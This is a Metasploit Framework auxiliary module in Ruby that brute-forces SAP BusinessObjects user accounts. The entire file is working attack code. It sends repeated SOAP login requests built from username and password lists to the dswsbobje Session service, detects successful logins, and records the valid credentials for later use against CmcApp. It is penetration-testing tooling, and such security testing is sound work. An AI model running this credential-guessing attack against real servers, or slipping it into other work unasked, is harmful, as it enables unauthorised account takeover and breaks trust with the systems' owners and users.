##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		   => 'SAP BusinessObjects User Bruteforcer',
			'Version'		=> '$Revision$',
			'Description'	=> 'This module simply attempts to bruteforce SAP BusinessObjects users. The dswsbobje interface is only used to verify valid credentials for CmcApp. Therefore, any valid credentials that have been identified can be leveraged by logging into CmcApp.',
			'References'  =>
				[
					# General
					[ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]
				],
			'Author'		 => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],
			'License'		=> MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('URI', [false, 'Path to the SAP BusinessObjects Axis2', '/dswsbobje']),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
								'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
		register_autofilter_ports([ 8080 ])
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'	 => "/dswsbobje/services/listServices",
			'method'  => 'GET',
				'headers' => {
					'User-Agent' => datastore['UserAgent']
				}

		}, 25)
		return if not res

		each_user_pass { |user, pass|
			enum_user(user,pass)
		}
	end

	def enum_user(user='administrator', pass='pass')
		verbose = datastore['VERBOSE']
		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'")
		success = false
		soapenv='http://schemas.xmlsoap.org/soap/envelope/'
		xmlns='http://session.dsws.businessobjects.com/2007/06/01'
		xsi='http://www.w3.org/2001/XMLSchema-instance'

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<soapenv:Envelope xmlns:soapenv="' +  soapenv + '" xmlns:ns="' + xmlns + '">' + "\r\n"
		data << '<soapenv:Body>' + "\r\n"
		data << '<login xmlns="' + xmlns + '">' + "\r\n"
		data << '<credential xmlns="' + xmlns + '" xmlns:ns="' + xmlns + '" xmlns:xsi="' + xsi + '" Login="' + user  + '" Password="' + pass + '" xsi:type="ns:EnterpriseCredential" />' + "\r\n"
		data << '</login>' + "\r\n"
		data << '</soapenv:Body>' + "\r\n"
		data << '</soapenv:Envelope>' + "\r\n\r\n"

		begin
			res = send_request_raw({
				'uri'		  => "/#{datastore['URI']}/services/Session",
				'method'	   => 'POST',
				'data'	  => data,
				'headers' =>
					{
						'Content-Length' => data.length,
						'SOAPAction'	=> '"' + 'http://session.dsws.businessobjects.com/2007/06/01/login' + '"',
						'Content-Type'  => 'text/xml; charset=UTF-8',
					}
			}, 45)
			return :abort if (res.code == 404)
			success = true if(res.body.match(/SessionInfo/i))
			success

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
			return :abort
		end

		if success
			print_good("#{rhost}:#{rport} - Successful login '#{user}' : '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto  => 'sap-businessobjects',
				:user   => user,
				:pass   => pass,
				:target_host => rhost,
				:target_port => rport
			)
			return :next_user
		else
			vprint_error("#{rhost}:#{rport} - Failed to login as '#{user}'")
			return
		end
	end
end